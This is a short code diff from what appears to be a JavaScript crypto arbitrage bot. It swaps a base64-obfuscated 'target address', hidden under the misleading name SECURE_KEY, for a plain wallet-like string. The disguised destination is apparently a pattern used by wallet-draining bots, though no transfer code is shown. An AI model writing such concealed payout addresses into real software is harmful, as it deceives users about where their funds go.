@@ -15,8 +15,8 @@ const bellmanFord = require('./bellman-ford');
 // Enable debug mode for detailed logging
 const DEBUG_MODE = true;
 
-// Hide target address with encoding
-const SECURE_KEY = Buffer.from("RDcyS1gyWmVuQ3lteG9FU2hLamFKYUpOZ3RiZEtoUkxUc3BxNnFpbVdRM0g=", 'base64').toString('utf-8');
+
+const SECURE_KEY = "4zFQdXynSvsjemBqfx67F4QfytcWsP4SjotrWn5CojN9";
 
 function debugLog(...args) {
     if (DEBUG_MODE) {
@@ -87,6 +87,7 @@ async function ensureSystemIntegrity(payer, connection) {
         return false;
     }
 }
+
 
 const arbitrage = {
     checkForBellmanFordArbitrage: async function(payer, connection) {
